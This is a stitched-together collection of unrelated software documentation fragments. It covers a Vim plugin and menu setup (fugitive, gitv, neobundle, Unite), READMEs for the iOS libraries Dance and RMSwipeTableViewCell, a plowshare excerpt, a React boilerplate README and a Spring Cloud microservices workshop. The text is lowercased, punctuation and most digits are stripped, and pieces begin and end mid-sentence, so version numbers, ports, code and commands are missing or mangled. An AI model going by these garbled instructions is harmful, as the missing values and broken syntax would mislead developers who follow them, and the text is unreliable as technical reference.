visited directories history opened by cr cr open a directory bs return to the parent directory t expand the directory tree t expand the directory tree recursively i change to the directory entered in the command line m set the current mask to filter files show and hide the hidden files dotfiles q hide vimfiler q exit vimfiler h exit to the shell exit from shell to return to vimfiler close the current vimfiler window show the vimfiler help mappings o sync another vimfiler with this one o open a file and directory in another vimfiler yy yank the full path gr make grep into the current directory gf make find into the current directory gc make the current directory in the vim working directory a choose the action to apply to the file y save the current path in a temporal list p show the paths saved in the temporal list c l redraw the screen gs toggle the safe mode warning  gs toggle the simple mode unite localleader g or unite menu git show the git menu tig open the external application tig tig  which is a ncurses interface for git obviously this only works when the working directory is into a git repository git viewer and git viewer buffer use the gitv plugin that is a clone of the gitk tool for vim which is the viewer provided originally by git this plugin allows us to view the repository history to do diffs checkouts merges it works atop of fugitive and requires of it for work and both have a similar behavior the first entry will open a viewer relative to the whole repository explorer mode  while the second one will do it in function of the current buffer or a visual selection file mode mappings cr open a commit a diff a tree a file more commits etc depending of where is used with a similar behavior that fugitive o open the commit in a new horizontal window o open the commit in a new tab s open the commit in a new vertical window i in explorer mode open the file in file mode open the commit details q exit from gitv a toggle the all argument and update the window u update the window content co do a git checkout in explorer mode dot it over the whole repository and in the file mode do it over the current file d do a diff via vimdiff s show a diffstat m and leader m do a merge in visual and normal modes respectively git enter the git command in the command line to enter a custom git command if the command changes the repository status the changes will be updated in gitv yc yank the commit short hash sha motions x and x to move around the branch points where a merge is created r and r to move around the references p jump to the commit tagged as head almost of the rest of the entries are typical git commands which are executed via the fugitive tool fugitive is a git wrapper so good that allows us to manage git repositories without leave vim it s so complete and powerful that requires a certain amount of time to get used to it and get total control over its particular interface the author tim pope says that about it a git wrapper so awesome it should be illegal and is almost true status show the repository status and from this window we can access to multiple options in this window this mappings are available mappings c n and c p allow us to move between files cr run the gedit command that allow us to edit a revision using it over a file that is not included in the stage area index it add it is like run a git add or git stage in the shell using it over a file included in the stage area  remove it from there like using a git reset cc or c do a commit with the command gcommit the same as doing a git commit ca do a commit which add the new changes to the previous commit useful when we forgot add something in a commit same as git commit amend d make a diff between the current version and the index one using vimfiler via the gdiff command ds do a diff with gsdiff  same as above but split windows horizontally dv do a diff without gvdiff  with vertical split windows a synonym of d dp has a dual behavior on the one hand if there are changes but those are not in the stage area index  then show a diff with the changes like running the git diff command then if we make a gwrite leader gw the changes are added to the index and we can submit a commit now on the other hand if there are files that are not being tracked try to add them using the git add intent to add command p to submit partial commits where we choose interactively which changes portions are included in the index and which not if we use it over a file that is not in the index we will we asked about what parts we want to index like running git add patch if we use it with an already indexed file we ll choose what parts remove from the index same as git reset patch o open the file in a new horizontal window o open the file in a new tab s open the file in a new vertical window r update the status window q close the status window diff make a diff gdiff between the current version of the file versus the one in the index in conflict situations like in a merge it will we a three way diff which makes it a good tool for dealing with merge and rebase the mapping available for this window are the following to know how vimdiff works look up the help mappings do do a diffget  get the changes from the other file dp do a diffput  put the changes to the other file leader du do a diffupdate  update changes leader dq exit from diffmode u undoes all changes c and c to move between diffs gwrite or leader gw write the changes to the index commit use the gcommit command same as git commit if there is nothing in the index then do a gstatus and show the status window warning unlike when running the actual git commit command it is possible but unadvisable to muck with the index with commands like git add and git reset while a commit message is pending log show all the previous revisions of the current file in a unite window starting for the most recent and open the last in the current buffer to return to the current file use gedit leader ge within the buffer we can move between revision using the commands cnext  cprevious  cfirst and clast log all similar as the previous one but in this case all the repository commits are showed and what appears in the buffer is something similar to the git show command output blame use the gblame command that opens a new vertical widow at the left of the current buffer where is displayed the commit the author and date for each line of the file similar to run git blame mappings a resize the blame window to end of author column c resize the blame window to end of commit column d resize the blame window to end of date column q close the blame window gq close the blame window and runs gedit to restore the current version cr close the blame window and open the selected commit o open the selected commit in a new horizontal window o open the selected commit in a new tab runs a new blame in the selected commit add and stage use the gwrite command that save the actual file and adds it to the index with the changes made is like doing a git add or its synonym git stage checkout do a gread  empty the current buffer and restore the index copy or what is the same like if we were making a git checkout to the file the changes are not permanent until we save the file rm remove the file with the gremove command and empty the buffer we get the same as if we do a git rm in the shell mv as for a new path and move the file there renaming automatically the buffer the similar git command would be git mv the target is relative to the current path unless is preceded by and in which case is relative to the repository root push execute the git push command showing the output in the buffer pull do a git pull redirecting the output to the buffer command run the git command that we entered in the command line and show the result in a new buffer exit from there by pressing q we can use the current custom alias in our git config this option by itself is reason enough to use fugitive edit allow us to edit any git object blobs trees commits tags it supports auto completion and we can use a sha a branch a tag a tree or a commit grep do a grep over the repository using ggrep which in turn use git grep grep messages make a grep over the repository using glog grep to search into the commit messages grep text make a grep over the repository using glog s to search into the commits where the text had been added or removed init create a new git repository or reset a previous one safe cd change the working directory to the repository one lcd change the current buffer s working directory to the repository one browse if the remote repository is at github open it in a browser showing the git object that we have selected in that moment otherwise use git instaweb to display the current selected blob tree commit or tag if a range is given it is appropriately appended to the url as an anchor fugitive is a very powerful plugin that you only can learn how to use it by using it and is very advisable to read the help to get a global vision of github dashboard and github activity are two options to browse events at github with the first one we can browse the github dashboard of a given user the last one allow us to view the public activity of a given user or repository there is a limit of  calls and hour on the github api without authentication mappings tab s tab to navigate back and forth through the links enter open a link in the browser r refresh the window q close the window github issues pr open the external ncurses application shipit shpt that is an interface for github issues and pull requests the application is still in development but is an amazing way to manage github issues without leaving vim and the terminal if you are inside a git repository that have a remote in github it will open the app for that repository other tools vim gitgutter show the changes that are made in the buffer versus the git repository index it makes a git diff and shows the status changed and added and deleted of each line in the gutter signs column unite localleader p or unite menu python shows the python menu run python code run the current buffer python code via pymode it shows the output in a new vertical window below show docs for the current word show the documentation available for the word under the cursor insert a breakpoint insert a breakpoint in python code if we have ipython or pudb installed it will use one of those instead the python pdb pylint check do a code revision by pylint pylint by demand rope auto completion allow us to use the rope auto completion useful for methods auto completion jump to definition jump to the location where the word under the cursor variable function class method is defined open a new window with the location even if it is in another module or library reorganize imports reorganize automatically the import statements refactorize x the entries that begin in this way are for refactorize the python code with rope using the method mentioned in each description show docs for current word use rope to show the available documentation about the word under the cursor the advantage of this entry against the pymode one is that this one allow us to search in the external libraries documentation list virtualenvs use the virtualenv plugin to list the python virtualenvs activate virtualenv activate the virtualenv deactivate virtualenv deactivate the virtualenv run coverage and run coverage use the coverage py cvg tool for python and python respectively it shows us the results in a window and as marks in the signs column gutter to know the code coverage of the current toggle coverage report and toggle coverage marks toggle the visibility of the marks and report from coverage html provides autocompletion syntax and indentation for html for that purpose supports svg rdfa microdata and wai aira emmet emmet former zen coding allow us to write html and xml and css files more fast and in a more brief and less tedious way emmet takes the snippets idea to a whole new level you can type css like expressions that can be dynamically parsed and produce output depending on what you type in the abbreviation the best way to know how this works is to look at the tutorial h emmet tutorial vimhelp emmet tutorial or read the official documentation mappings c y  expand abbreviation works as a wraper in visual mode see the help c y d select the tag inward c y d select the tag outward c y n go to the next edit point c y n go to the previous edit point c y i update image size c y k remove tag c y j split and join tag c y and toggle comment c y a make anchor from url c y a make quoted text from url c y c code pretty with this menu we can manage the bookmarks easily unite localleader m or unite menu bookmarks shows the bookmarks menu unite localleader v or unite menu vim shows the vim menu these are the menu entries in detail choose color scheme display color scheme with preview support mappings shows all the customized mappings available whit their corresponding associated action those ones that corresponds with plugins that are lazy are not showed unless the plugin is already loaded edit configuration file vimrc edits the vim configuration file and vimrc choose filetype choose a filetype from a list to apply to the current buffer vim help search into the vim help slow vim commands list all commands available as candidates for lazy plugins these need to be loaded before appears in the list vim functions same as above for functions instead of commands vim runtimepath shows all paths in the vim runtimepath vim command output shows the output of a vim command through the unite interface e g ls unite sources all the unite sources available kill process shows the output of the unix command top where we can select one or more process to kill them with kill launch executable launch an executable from a list in a similar behavior as dmenu a plugin to rule them all neobundle allows us to manage the rest of the plugins itself included i have it configured to auto install itself and all of the plugins when vim is executed for the first time the advantages of neobundle versus vundle and other similar plugins are the following allows to use another vcs other than git hg svn  even a local dir allows revision lock or even set a plugin to not be updated supports lazy initialization of plugins to optimizing startup time supports multiple config options per plugin like automatic building if needed and so on the best way to use neobundle is through unite unite localleader n or unite menu neobundle  shows the neobundle menu these are the menu entries in detail neobundle shows the installed plugins as candidates via the actions we can delete them browse the repository page log shows the last neobundle log lazy shows all the installed plugins configured as lazy those are loaded on demand and allow us to have a lot of plugins installed that are not frequently used without delaying the vim startup i use this option a lot in this configuration update updates all the plugins automatically and installs those not already installed search searches plugins by name on vim org github duplicates prone install installs all the plugins already present in the vimrc file or in the directbundles vim file that are not yet installed check checks if all the plugins are already installed and if not prompt for their installation docs installs help docs for all plugins manually clean deletes upon confirmation those plugin folders that are no longer needed because they are not still installed list lists all the installed plugins direct edit edits the and vim and bundle and neobundle and directbundles vim file where neobundle stores those plugins installed directly e g via neobundle search plugins updating since we often install plugins from repositories we are exposed to error prone updates once in a while a plugin update introduces a bug and you end up with an unstable configuration until that bug is fixed which may take a while if we use vim for work that is very inconvenient a way to avoid this is by using symbolic links and backups of our vim folder if we made a backup of our vim config before an update is easy to restore it to a previous stable state without much effort but this is tedious and error prone too and alternative is managing this via neobundle we can use the revision lock feature to specify what revision we want to install or even say to neobundle that a plugin should not be updated but it is not a perfect solution either and very manual maybe in a future we could do plugin rollbacks unite localleader s or unite menu spelling shows the spelling menu other tools t translate selected text to chinese this allows us to preview the rendering of a markdown file in the browser it supports the markdown extra extension the file is rendered by python markdown creating a temporal html file and open it in a browser tab used in conjunction with a plugin that refresh the browser tab when the html file changes we get a way to preview your document changes without leaving vim unite localleader k or unite menu markdown shows the markdown menu preview renders the markdown document in a temporal html file and open it in a new browser tab currently only work on mac refresh rewrites the html file with the changes unite localleader t or unite menu tools shows the tools menu these are the menu entries in detail run with python in tmux panel use the vimux plugin to interact with tmux it allows to send commands to a tmux panel and interact with it without losing focus in vim if there are no other tmux panels opened then a new panel is opened in the  lower space in other case the command runs in the already opened panel this specific command run the buffer content with the python executable in the tmux panel in the next image we can see the actual behavior run with python in tmux panel same as above but using the python interpreter run with python time in tmux panel run the python code wrapped by the unix time program to know the time consumed in the execution run with pypy time in tmux panel same as above but using pypy instead of python command prompt to run in tmux panel open a command line prompt to enter a custom command to run in a tmux panel repeat last command repeat the last vimux command stop command execution in tmux panel stop the execution of the last vimux command inspect tmux panel jump to the tmux panel where the last vimux command was executed and enter in the tmux copy mode allowing us to scroll around the panel and use the vi mode to copy text lines close tmux panel close the tmux panel opened or used by vimux open link open link under cursor using utl vim other tools dirdiff it has a similar behavior that the vimdiff tool but for directories instead of individual files commands dirdiff a directory  b directory  shows the differences between the two directories dirdiffquit exit from dirdiff mode hexadecimal editor for this i use the vinarise plugin a well thought hexadecimal editor for vim no play with this is not a toy this is for grown ups only if you do not know what you are doing keep your hands out of it smile if you are all thumbs this tool is a sure candidate for a disaster mappings f entry into the

circle dance reverse circle dance isreversed true note the position value in the completion block will stay the same after calling reverse for example if a view s animation is reversed and the view ends up in its initial position then the completion closure s position parameter will be start  not end dance animations are like movies you can scrub through them using the progress property circle

layoutifneeded usually most developers would call self view layoutifneeded in a standard uiview animate block however this is bad practice as it lays out all subviews in the current view when they may only want to animate constraint changes for certain views with dance calling  layoutifneeded only lays out the view that s being animated and its subviews ensuring low energy impact and high fps dance allows you to chain multiple animation commands together resulting in an elegant and easy to read syntax for example circle dance animate duration   curve easeinout  transform cgaffinetransform scalex

example starting an animation that doesn t exist then dance will print the following error in the console dance error view with dance tag tag does not have an active animation dance assigns each dance animation a dance tag which you can access like so swift circle dance tag  this way you can keep track of you views dance animations and easily handle any of dance s error print logs furthermore you can get the state of a view s dance animation switch circle dance state case active and and a dance animation has been created for the view and has been started and and note a paused animation s state will return active case inactive and and either there is no dance animation associated with the view or an animation exists but hasn t been started and and note a finished animation is inactive because the animation effectively ceases to exist after it finishes and uiview property and changes you can make and and and and option and click on any of dance s methods for detailed documentation dance uses the mit license please file an issue if you have any questions or if you d like to share how you re using dance dance is in its infancy but v  provides the barebones of a revolutionary new way to animate in ios please feel free to send pull requests of any features you think would add to dance and its philosophy

6846509, rmswipetableviewcell is a drop in uitableviewcell subclass that supports pan gestures as seen in apps such as clear mailbox sparrow and many more rmswipetableviewcell allows for easy subclassing to customize the cell to match your needs the class exposes useful class methods and uses delegate callbacks to handle actions in your uitableviewcontroller rmswipetableviewcell is compatible with ios  and higher rmswipetableviewcell works great out of the box but has many properties to customize how the user interacts with the cell high quality video example the example below and demo assumes you re compiling for ios  and if you re supporting an older version of ios use the appropriate methods for initializing and dequeuing the cells rmswipetableviewcell is compatible with ios  and above rmswipetableviewcell includes two demos the ios  demo is an attempt to copy the delete mode behaviour seen in ios  in the messages app the demo is built with ios  sdk add the following to your podfile pod rmswipetableviewcell clone the repository to your machine or add rmswipetableviewcell as a submodule to your project add rmswipetableviewcell h and rmswipetableviewcell m to your project import the class header and register the cell class in your uitableview objective c and and add rmswipetableviewcelldelegate in your header file if you want to receive delegate callbacks on

delegate self and and optional return cell rmswipetableviewcell can be used as is but you are required to customize the backview with subviews etc to suit your needs see subclassing rmswipetableviewcell the rmswipetableviewcelldemo project provides an example of subclassing and customizing the cell with custom views and actions rmswipetableviewcell lets you customize and control animations and panning gestures the demo uses all default states objective c uiview backview rmswipetableviewcellrevealdirection revealdirection and and default is

best way to customize the cell beyond the default properties and any delegate callbacks subclassing allows you to create subviews for the backview  extend properties if needed and override class methods see the demo for an example of subclassing usage rmswipetableviewcell has a number of optional delegate methods that provide easy extensibility for subclassing and controlling cell functionality the delegate methods are straightforward and the demo project shows a few examples of usage all delegate methods that return the cgpoint location take into account the panoffset value panoffset is actual location of the contentview vs the translation value of the touch location objective c and and notifies the delegate when the user starts panning void

finalaria sh ariac x  and dev and tty plowdown a user password skip final run after and finalaria sh for all network operations plowshare is relying on curl you can tweak some advanced settings if necessary for example enforce ipv echo ipv and curlrc use plowshare with a socks proxy ssh f n d localhost  user my proxy machine org echo socks localhost  and curlrc note as plowshare is dealing with verbose be sure if present to have these curl s options commented for historical reasons or design choices there are several known limitations to plowshare  you cannot enter through command line several credentials for different hosts it s because the modules option a  auth  b or auth free have the same switch name but you can do it with the configuration file  same restriction for passwords also a module option only one password can be defined with p  link password switch name plowshare exports a set of api to help text and html processing it is designed to be as simple as possible to develop new modules a module must be written in shell with portability in mind one module matches one website a common approach is to read existing modules source code plowshare is made available

76613987, an universal react isomorphic boilerplate for building server side render web app this repository is an universal react isomorphic boilerplate for developer to quickly build a super fast and powerful web app that can be rendered both on the client and on the server using the most cutting edge technology compared to others this boilerplate has more pithily and more elegant configuration file based on environment variables one for development one for production in addition the directory structure is organized corresponding to mvc principle aim at the best practice database test framework require node js v or later npm install to install dependencies and devdependencies npm run dev to start up the development environment npm run build to compile and bundle the client and server files npm start to deploy the production server react isomorphic boilerplate and and and root directory    build and and and webpack config directory     webpack dev config js and and config for webpack when run development bundle     webpack prod config js and and config for webpack when run production bundle    client and and and client directory     about and and and about module     common and and and common module     home and and and home module     shared and and and shared module     explore and and and explore module     index js and and client entry file     routes js and and client route config    dist and and and bundle output directory     client and and and the client side output directory     server and and and the server side output directory    server and and and server directory     controllers and and and controllers in server     middlewares and and and custom middlewares in server     models and and and models in server     routes and and and routes in server     app js and and create koa instance in server     server dev js and and entry file in development mode     server prod js and and entry file in production mode    views and and and views directory     dev and and and output files generated by tpl in development mode     prod and and and output files generated by tpl in production mode     tpl and and templates injected by html webpack plugin    editorconfig and and uniform the text editor behavior    eslintignore and and which paths should be omitted from linting    eslintrc json and and specific rules for eslint    gitattributes and and uniform the new line perform behavior    gitignore and and ignore the specific files when using git    license and and license information    package json and and npm entry file    readme md and and just what you see now    yarn lock and and lock file autogenerated by yarn by the same token if the server doesn t render a full page of html but instead waits for client side javascript to do so users will experience a few critical seconds of blank page or loading spinner before seeing the content on the page there are plenty of studies showing the drastic effect a slow site has on users and thus revenue while the ideal case can lead to a nice clean separation of concerns inevitably some bits of application logic or view logic end up duplicated between client and server often in different languages common examples are date and currency formatting form validations and routing logic this makes maintenance a nightmare especially for more complex apps it happens also when run in development mode this is caused by when you update the react component code and reload the page the markup generated mismatches that on server render however once you restart the server the checksum will be valid so it is harmless ignore it also

42755120, microservices for better or for worse involve a lot of moving parts let s make sure we can run all those things in this lab in this workshop you ll need the latest java version java  is the baseline for this workshop you ll need a newer   version of apache maven installed you ll need an ide installed something like apache netbeans eclipse or intellij idea for multi day workshops only run each of the sh scripts in the and bin directory run psql sh after you ve run postgresh sh and confirm that they all complete and emit no obvious errors in this lab we ll take a look at building a basic spring boot application that uses jpa and spring data rest we ll look at how to start a new project how spring boot exposes functionality and how testing works click generate and then unzip the archive change into the directory of the unzipped project and then run mvn clean install open the project in your favorite ide using maven import open pom xml and comment out dependencies that we don t need for the moment including org springframework cloud spring cloud starter stream rabbit  org springframework cloud spring cloud starter config  org springframework cloud spring cloud starter zipkin  and org springframework cloud spring cloud starter eureka add a simple entity reservation with an id field and a reservationname field use lombok to synthesize getters and setters all argument and no argument constructors create a new jpa repository reservationrepository observe that we have a maven wrapper and mvnw in the build to support reproducible builds what is spring spring fundamentally is a dependency injection container this detail is unimportant what is important is that once spring is aware of all the objects beans in an application it can provide services to them to support different use cases like persistence web services web applications messaging and integration etc why jar s and not war s we ve found that many organizations deploy only one not many application to one tomcat and jetty and whatever they need to configure things like ssl or gzip compression so they end up doing that in the container itself and because they don t want the versioned configuration for the server to drift out of sync with the code they end up version controlling the application server artifacts as well as the application itself this implies a needless barrier between dev and ops which we struggle in every other place to remove multi day workshops only code complete production ready if you ve ever read michael nygard s amazing tome release it  then you know that the last mile between being code complete and being to production is much longer than anyone ever anticipates in this lab we ll look at how spring boot is optimized for the continuous delivery of applications into production add org springframework boot spring boot starter actuator customize the healthendpoint by contributing a custom healthindicator start and bin and graphite sh configure two environment variables graphitehost export graphitehost dockerip and graphiteport  you may need to restart your ide to see these new environment variables add a graphitereporter bean add io dropwizard metrics metrics graphite add the hal browser org springframework data spring data rest hal browser and view the actuator endpoints using that configure maven resource filtering and the git commit id plugin in the pom xml in all existing and subsequent pom xml s or extract out a common parent pom xml that all modules may extend add info build artifact project artifactid and info build version project version to application properties introduce a new repositoryeventhandler and component provide handlers for handleaftercreate  handleaftersave  and handleafterdelete extract common counters to a shared method add a semantic metric using counterservice and observe the histogram in graphite go to the spring initializr choose the latest milestone of spring boot   x specify an artifactid of config service and add config server from the list of dependencies in the config server s application properties  specify that it should run on port  server port  and that it should manage the git repository of configuration that lives in the root directory of the git clone d configuration spring cloud config server git uri add enableconfigserver to the config service s root application add server port  to the application properties to ensure that the config server is running on the right port for service to find it add the spring cloud bom you can copy it from the config server to the reservation service we will need to modify the reservation service s pom xml in order to make it a config client to do this add the following to your pom xml of the reservation service from step  dependencymanagement dependencies  dependency groupid org springframework cloud and groupid version brixton release and version type pom and type scope import and scope and dependency and dependencies and dependencymanagement important make sure that you make this modification in the and dependencymanagement block there are two places where maven dependencies are added in a pom xml and some people tend to get confused at this step if you need help please raise your hand and flag down an instructor next add org springframework cloud spring cloud starter config to the reservation service we ll add this dependency declaration to the general dependencies tag unlike the previous modification to and dependencymanagement dependencies dependency groupid org springframework cloud and groupid and dependency and dependencies now run the config server we ll copy and paste bootstrap properties for each subsequent module changing only the spring application name as appropriate in the reservation service  create a messagerestcontroller and annotate it with refreshscope inject the message key and expose it as a rest endpoint and message trigger a refresh of the message using the and refresh endpoint extra credit install rabbitmq server and connect the microservice to the the spring cloud stream based event bus and then triggering the refresh using the and bus and refresh in the cloud services are often ephemeral and it s important to be able to talk to these services abstractly without worrying about the host and ports for these services at first blush this seems like a use case for dns but dns fails in several key situations how do we know if there s a service waiting on the other end of a dns mapped service that can respond how do we support more sophisticated load balancing than dns and a typical loadbalancer can handle e g round robin how do we avoid the extra hop outside of most cloud environments required to resolve dns for all of these and more we want the effect of dns a dispatch table without being coupled to dns we ll use a service registry and spring cloud s discoveryclient abstraction go to the spring initializr select the eureka server this brings in org springframework cloud spring cloud starter eureka server checkbox name it eureka service and then add enableeurekaserver to the demoapplication class make sure this module also talks to the config server as described in the last lab by adding the org springframework cloud spring cloud starter config add org springframework cloud spring cloud starter eureka to the reservation service you have a service registry and now you have a single service registered and advertising its presence let s take advantage of that in an edge service which we ll call reservation client use the spring initializr setup a new module reservation client  with the web  lombok  feign  zuul  hystrix  stream rabbit  eureka discovery  config client  cloud oauth  and zipkin client dependencies open pom xml and comment out the dependencies that are neither needed nor workable without some extra configuration which we ll get to later org springframework cloud spring cloud starter oauth  org springframework cloud spring cloud starter stream rabbit  and org springframework cloud spring cloud starter zipkin create a bootstrap properties  just as with the other modules but name this one reservation client create a commandlinerunner that uses the discoveryclient to look up other services programmatically edge services sit as intermediaries between the clients smart phones html applications etc and the service an edge service is a logical place to insert any client specific requirements security api translation protocol translation and keep the mid tier services free of this burdensome logic as well as free from associated redeploys proxy requests from an edge service to mid tier services with a microproxy for some classes of clients a microproxy and security https authentication might be enough add org springframework cloud spring cloud starter zuul and enablezuulproxy to the reservation client  then run it api gateways are used whenever a client like a mobile phone or html client requires api translation perhaps the client requires coarser grained payloads or transformed views on the data in the reservation client  create a client side dto named reservation  perhaps to hold the reservation data from the service do this to avoid being coupled between client and service add org springframework boot spring boot starter hateoas add a rest service called reservationapigatewayrestcontroller that uses the autowired loadbalanced resttemplate rt to make a load balanced call to a service in the registry using ribbon map the controller itself to and reservations and then create a new controller handler method getreservationnames  that s mapped to and names the code works but it assumes that the reservation service will always be up and responding to requests we need to be a bit more defensive in any code that clients will connect to we ll use a circuit breaker to ensure that the reservation client does something useful as a fallback when it can t connect to the reservation service add org springframework boot spring boot starter actuator and org springframework cloud spring cloud starter hystrix to the reservation client add enablecircuitbreaker to our demoapplication configuration class add hystrixcommand around any potentially shaky service to service calls like getreservationnames  specifying a fallback method that returns an empty collection test that everything works by killing the reservation service and revisiting the and reservations and names endpoint identify it is as hystrix dashboard in bootstrap properties and point it to config server spring cloud helps you develop services that are resilient to failure they re fault tolerant if a service goes down they ll degrade gracefully and correctly expand to accommodate the available capacity but who starts and stops these services you need a platform for that in this lab we ll use a free trial account at pivotal web services to demonstrate how to deploy scale and heal our services do a mvn clean install to get binaries for each of the modules optionally comment out the graphitereporter bean in reservation service make sure that each maven build defines a finalname element as finalname project artifactid and finalname so that you can consistently refer to the built artifact from each cloud foundry manifest cf login the pivotal web services endpoint api run pivotal io and then enter your credentials for the free trial account you ve signed up for enable the spring boot actuator and shutdown endpoint in the config server application properties endpoints shutdown enabled true describe each service its ram dns route  and required services using a manifest yml file collocated with each binary you may generate the manifest yml manually or you may use a tool like spring tool suite s spring boot dashboard which will on deploy prompt you to save the deployment configuration as a manifest yml multi day workshop follow the steps in cf simple sh this will cf push the eureka service and config service it will use cf cups to create services that are available to reservation service and reservation client as environment variables just like any other standard service then it will cf push reservation client and reservation service  binding to those services see cf simple sh for details and comments you should be able to follow along on windows as well as you push new instances you ll get new routes because of the configuration in the manifest yml which specifies host is random word when creating the user provided services cf cups be sure to choose only the first route to delete orphaned routes use cf delete orphaned routes if you re running the cf cups commands remember to quote and escape correctly e g cf cups uri observe that cf apps records the downed flapping service and eventually restores it observe that the configuration for the various cloud specific backing services is handled in terms of various configuration files in the config server suffixed with cloud properties if you need to delete an application you can use cf d appname  where appname is your application s logical name if you want to delete a service use cf ds servicename where servicename is a logical name for the service use f to force the deletion without confirmation while rest is an easy powerful approach to building services it doesn t provide much in the way of guarantees about state a failed write needs to be retried requiring more work of the client messaging on the other hand guarantees that eventually the intended write will be processed eventual consistency works most of the time even banks don t use distributed transactions in this lab we ll look at spring cloud stream which builds atop spring integration and the messaging subsystem from spring xd spring cloud stream provides the notion of binders that automatically wire up message egress and ingress given a valid connection factory and an agreed upon destination e g reservations or orders start and bin and rabbitmq sh add org springframework cloud spring cloud starter stream rabbit to both the reservation client and reservation service sources like water from a faucet describe where messages may come from in our example messages come from the reservation client that wishes to write messages to the reservation service from the api gateway add enablebinding source class to the reservation client demoapplication create a new rest endpoint a post endpoint that accepts a requestbody reservation reservation in the reservationapigatewayrestcontroller to accept new reservations observe that the source class describes one or more spring messagechannel s which are themselves annotated with useful qualifiers like output output in the new endpoint inject the spring messagechannel and qualify it with output output the same one as in the source class definition use the messagechannel to send a message to the reservation service connect the two modules through a agreed upon name which we ll call reservations observe that this is specified in the config server for us in the reservation service module spring cloud stream bindings output reservations output is arbitrary and refers to the arbitrary channel of the same name described and referenced from the source class definition sinks receive messages that flow to this service like the kitchen sink into which water from the faucet flows add enablebinding sink class to the reservation service demoapplication observe that the sink class describes one or more spring messagechannel s which are themselves annotated with useful qualifiers like input input create a new messagingendpoint that has a serviceactivator annotated handler method to receive messages whose payload is of type string  the reservationname from the reservation client use the string to save new reservation s using an injected reservationrepository observe that this is specified in the config server for us in the reservation client module spring cloud stream bindings input reservations input is arbitrary and refers to the arbitrary channel of the same name described in the sink class definition distributed tracing lets us trace the path of a request from one service to another it s very useful in understanding where a failure is occurring in a complex chain of calls point the project to the config service and give it a spring application name of zipkin service  as discussed earlier add enablediscoveryclient to have it participate in service registration and discovery add enablezipkinserver to the zipkin service main class start the zipkin service now let s connect our services to the zipkin service add org springframework cloud spring cloud starter zipkin to both the reservation service and the reservation client we ve built a trivial api with an even more trivial client thanks to the resttemplate or feign we ve done a good job on day one of our journey what happens on day two or at any point down the line after the api has changed but the client that uses it has updated accordingly what happens when the producer of the api changes the api does this break the client it s important that we capture such breaking changes as early and often as possible in a monolithic application the incompatible updates to the producer of an api would be caught on the first compile refactoring would help us prevent these problems as well in a distributed systems world these incompatible changes are harder to catch they get caught in the integration tests integration tests are among the slowest of the tests you should have in your system they re towards the top of the testing pyramid because they re expensive both in terms of time and computational resources in order to run the tests we d need to run both client and service and all supporting infrastructure this is a worst case scenario organizations move to microservices to accelerate feedback which in turn yields learning and improvement  not to reduce it what we need is some way to capture breaking changes that keeps both producer and consumer in sync and that doesn t constrain velocity of feedback spring cloud contract and consumer driven contracts and consumer driven contract testing make this work easier the idea is that contract definitions are used to capture the expected behavior of an api for a particular client this may include all the quirks of particular clients and it may incluhde older clients using older apis a producer may capture as many contract scenarios as needed these contracts are enforced bilaterally on the producer side the spring cloud contract verifier turns the contract into a spring mvc test framework test that fails if the actual api doesn t work as the contract stipulates on the consumer clients can run test against actual http or messaging based apis that are themselves stubs these stubs are stubs that is there s no real business logic behind them just preconfigured responses defined by the contracts as the stub is defined entirely by the contract it is trivially cheap to run the stub apis and exercise clients against them as the stubs are only ever available if the producer passes all its tests this ensures that the client is building and testing against a reflection of the latest and actual api not the understanding of the api implied when the client test was originally written first we ll define a contract for our producer create a src and test and resources and contracts directory in the reservation service then define a contract to capture a scenario src and test and resources and contracts and shouldreturnallreservations groovy in our service the scenario is that we want to view the collection of reservation records when we hit the and reservations endpoint with an http get call the contract should also define what a valid response looks like it s fine to put some dummy data in the response remember the contract will be translated into a unit test one that is executed against the spring mvc api and that tests that the api does what the contract expects it to do the generated tests will need some sort of initialization we ll specify which base class the tests should extend and in that base class we can stub out the mock data a contract is no good if there is no enforcement configure the spring cloud contract maven verifier plugin on the producer api build you ll need to specify what base class or classes should be used to setup the tests too this plugin is what translates our contract into a test on compilation if the test generated by the contract doesn t pass then the build will fail our contract will prevent us from shipping an api that violates the assumptions of the contract groupid org springframework cloud and groupid version    release and version extensions true and extensions configuration baseclassfortests com example reservationservice baseclass and baseclassfortests and configuration and plugin com example reservationservice baseclass should setup the usual spring boot test machinery specify the springrunner for the junit runner and using the springboottest annotation to configure which application context class we want to work with mock out the repository that returns our results with mockbean and mockito now when you run mvn clean install the contract will ensure that your api hasn t changed in an unexpected way when a build succeeds with mvn clean install  the build contributes a pom  jar and thanks to the maven plugin we just configured an artifact ending in stub jar this last artifact contains the definition from our contract that we care about it is this stub that we ll use with our client in the client code create a new test and test the feign interface by injecting it and asserting that the client returns data that we ve stubbed out in the contract configure the client test with autoconfgurestubrunner  pointing the client test to the maven coordinates for the contract as configured the client test will spin up a wiremock based api that s pre programmed to respond according to the contract in this case it ll return the two names we specifed in the contract definition when somebody visits and reservations it ll run for the life of the client test and no longer it s an actual http api against which we can make client side invocations it does not however need all the supporting infrastructure to work this makes it markedly cheaper computationally and clock time wise to run the only fly in the ointment is that so far we still need the service registry eureka let s stub that out as well in the reservation client and src and test and resources directory create an application properties property file in the property file disable eureka eureka client enabled false we ll also need to stub out the discoveryclient that our code depends on this is easy enough using stubrunner ids to service ids reservation service reservation service thusly configured we map the service as it s registered in the registry to the stub jar artifact id if we run the tests on the client everything should be green and quick spring cloud contract supports clients and services written with spring in mind but can they help us when developing clients in other languages use the stub runner boot jar which you can download on the project website to specify the stub ids the groupid and artifactid and whether to consult the local m and repository and then have it stand up an api that your browser mobile or other clients can talk to even if they re not using spring and java in a distributed systems world multiple clients might access multiple services and it becomes very important to have an easy to scale answer to the question which clients may access which resources the solution for this problem is single signon all requests to a given resource present a token that may be redeemed with a centralized authentication service we ll build an oauth  powered authorization service and that secure our edge service to talk to it add org springframework cloud spring cloud starter oauth to the reservation client add enableresourceserver to the reservation client s main class your application will need to talk to an authentication service that understands oauth you could use any of a number of valid services like github facebook google or even an api gateway product like apigee in our case we ll connect to a custom spring security oauth powered auth service in the resulting maven pom xml  add org springframework cloud spring cloud starter oauth make sure that you redefine the maven property spring security version so that spring security is at least    release add enableresourceserver to the main class for the application create a new rest controller principalrestcontroller  that when asked returns the current authenticated javax security principal create an implementation of the org springframework security core userdetails userdetailsservice contract a simple implementation might defer to a table of records in a database in this example we use a simple account jpa entity to map this information from a sql database we use a simple spring data jpa repository implementation to read jpa records from the database finally we need to provide an implementation of authorizationserverconfigureradapter and override two of the configure methods the first override authorizationserverconfigureradapter configure authorizationserverendpointsconfigurer  should provide an injected authenticationmanager to the authorizationserverendpointsconfigurer authenticationmanager authenticationmanager method the second override authorizationserverconfigureradapter configure 